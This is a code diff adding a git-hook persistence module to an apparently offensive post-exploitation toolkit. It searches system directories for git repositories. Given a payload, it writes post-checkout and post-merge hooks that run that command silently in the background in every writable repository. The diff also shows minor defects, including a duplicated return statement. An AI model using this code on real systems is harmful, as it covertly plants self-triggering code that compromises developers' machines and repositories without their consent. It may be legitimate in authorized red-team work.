@@ -699,3 +699,64 @@ echo "[+] XDG autostart entry created: $target_dir/${name}.desktop"
 
   return { output: output.join("\n"), findings }
 }
+
+export async function gitHookPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Git Hook Persistence ==="]
+  const payload = argVal(args, "--payload")
+
+  const script = `
+echo "--- Git Repositories ---"
+find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | while read gitdir; do
+  repo=$(dirname "$gitdir")
+  hookdir="$gitdir/hooks"
+  writable=$([ -w "$hookdir" ] && echo "WRITABLE" || echo "read-only")
+  echo "  $repo ($writable)"
+  for hook in post-checkout post-merge pre-push pre-commit; do
+    if [ -f "$hookdir/$hook" ]; then
+      echo "    [!] $hook exists"
+    fi
+  done
+done
+echo ""
+${payload ? `
+echo "--- Installing Git Hook Persistence ---"
+installed=0
+find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | while read gitdir; do
+  hookdir="$gitdir/hooks"
+  if [ -w "$hookdir" ]; then
+    for hook in post-checkout post-merge; do
+      if [ ! -f "$hookdir/$hook" ]; then
+        printf '#!/bin/bash\\n${payload} &>/dev/null &\\n' > "$hookdir/$hook"
+        chmod +x "$hookdir/$hook"
+        echo "[+] Hook installed: $hookdir/$hook"
+        break
+      fi
+    done
+  fi
+done
+` : `echo "[*] Dry run — pass --payload <cmd> to install hooks in discovered repositories."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  const hooks = (r.stdout.match(/\[+\] Hook installed/g) || []).length
+  if (hooks > 0) {
+    findings.push({
+      checkId: "LNX-GITHOOK-001",
+      provider: "linuxhook",
+      severity: "MEDIUM",
+      status: "INSTALLED",
+      resource: "git_hooks",
+      title: "Git hook persistence installed",
+      details: `${hooks} git hook(s) installed — triggers on git checkout/merge/push operations`,
+      remediation: "Audit .git/hooks/ directories in all repositories. Remove unauthorized hook scripts.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+
+  return { output: output.join("\n"), findings }
+}
